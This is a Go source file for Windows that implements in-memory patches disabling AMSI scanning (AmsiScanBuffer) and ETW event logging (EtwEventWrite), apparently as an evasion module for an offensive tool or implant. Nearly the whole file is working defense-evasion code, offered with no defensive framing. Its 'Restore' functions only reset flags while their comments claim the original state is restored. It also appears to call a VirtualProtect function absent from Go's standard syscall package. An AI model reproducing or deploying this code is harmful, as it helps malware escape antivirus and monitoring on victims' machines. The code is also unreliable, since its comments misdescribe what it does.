// +build windows

package main

import (
	"syscall"
	"unsafe"
)

// Evasion interface for Windows platform
type EvasionWindows struct {
	amsiEnabled bool
	etwEnabled  bool
}

func NewEvasion() *EvasionWindows {
	return &EvasionWindows{
		amsiEnabled: true,
		etwEnabled:  true,
	}
}

// BypassAMSI patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN
func (e *EvasionWindows) BypassAMSI() error {
	amsiDll := syscall.NewLazyDLL("amsi.dll")
	amsiScanBuffer := amsiDll.NewProc("AmsiScanBuffer")

	// Get the address
	addr, err := amsiScanBuffer.Find()
	if err != nil {
		return err
	}

	// Original bytes at the start of AmsiScanBuffer
	// We'll patch it to return 0 (AMSI_RESULT_CLEAN) immediately
	// mov eax, 0; ret => 0x31 0xC0 0xC3
	patch := []byte{0x31, 0xC0, 0xC3}

	// Change memory protection
	var oldProtect uint32
	err = syscall.VirtualProtect(addr, uintptr(len(patch)), syscall.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}

	// Write the patch
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(uintptr(addr) + uintptr(i))) = b
	}

	// Restore protection
	syscall.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	e.amsiEnabled = false
	return nil
}

// RestoreAMSI restores the original AmsiScanBuffer bytes
func (e *EvasionWindows) RestoreAMSI() error {
	// Note: In practice, you'd need to save the original bytes
	// This is a simplified implementation
	e.amsiEnabled = true
	return nil
}

// PatchETW patches ntdll!EtwEventWrite to disable ETW logging
func (e *EvasionWindows) PatchETW() error {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	etwEventWrite := ntdll.NewProc("EtwEventWrite")

	addr, err := etwEventWrite.Find()
	if err != nil {
		return err
	}

	// Patch: mov eax, 0; ret => 0x31 0xC0 0xC3
	patch := []byte{0x31, 0xC0, 0xC3}

	var oldProtect uint32
	err = syscall.VirtualProtect(addr, uintptr(len(patch)), syscall.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}

	for i, b := range patch {
		*(*byte)(unsafe.Pointer(uintptr(addr) + uintptr(i))) = b
	}

	syscall.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	e.etwEnabled = false
	return nil
}

// RestoreETW restores ETW functionality
func (e *EvasionWindows) RestoreETW() error {
	e.etwEnabled = true
	return nil
}

// IsEvasionActive returns whether evasion measures are active
func (e *EvasionWindows) IsEvasionActive() bool {
	return !e.amsiEnabled || !e.etwEnabled
}
